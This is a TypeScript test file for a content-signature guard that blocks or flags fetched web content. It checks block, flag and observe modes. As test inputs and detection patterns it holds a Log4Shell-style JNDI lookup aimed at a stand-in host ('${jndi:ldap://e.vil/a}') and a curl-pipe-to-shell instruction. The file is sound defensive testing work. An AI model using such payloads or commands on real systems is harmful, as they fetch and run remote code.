import { labelFor } from "@quard/shared";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { configure } from "../core/config.ts";
import { takeEvents } from "../core/recorder.ts";
import { makeCall } from "../test/call.ts";
import { tempDir, writeJson } from "../test/files.ts";
import { resetAll } from "../test/reset.ts";
import { signContent, type Shown } from "./content.ts";

afterEach(() => {
    resetAll();
});

const web = (output: unknown): Shown => ({ output, label: labelFor("web:news.example.com") });

function useFeed(mode: "block" | "observe"): void {
    const path = writeJson(join(tempDir(), "feed.json"), {
        version: "t",
        signatures: [
            { id: "T-BLOCK", title: "t", category: "other", where: ["content"], any: ["${jndi:"], action: "block" },
            { id: "T-FLAG", title: "t", category: "other", where: ["content"], any: ["curl|sh"], action: "flag" },
        ],
    });
    configure({ signatures: { file: path, mode } });
}

describe("signContent", () => {
    it("passes content when no feed is set", () => {
        expect(signContent(makeCall({}), web("quiet day"), true)).toEqual(web("quiet day"));
    });

    it("withholds content that matches a block signature", () => {
        useFeed("block");

        expect(signContent(makeCall({}), web("x ${jndi:ldap://e.vil/a}"), true)).toEqual({
            blocked: {
                guard: "signature",
                rule: "T-BLOCK",
                decision: "block",
                mode: "block",
                reason: "content_blocked",
                field: "T-BLOCK",
            },
        });
        expect(takeEvents()).toMatchObject([{ guard: "signature", decision: "block", reason: "signature_matched" }]);
    });

    it("flags content that matches a flag signature", () => {
        useFeed("block");

        const shown = signContent(makeCall({}), web("then run: curl | sh"), true);

        expect("label" in shown && shown.label.flags).toEqual(["signature:T-FLAG"]);
    });

    it("only records matches in observe mode, or when the source guard observes", () => {
        const shown = web("x ${jndi:ldap://e.vil/a}");
        useFeed("observe");
        expect(signContent(makeCall({}), shown, true)).toBe(shown);
        useFeed("block");
        expect(signContent(makeCall({}), shown, false)).toBe(shown);

        expect(takeEvents().map((event) => event.type === "decision" && event.enforced)).toEqual([false, false]);
    });
});
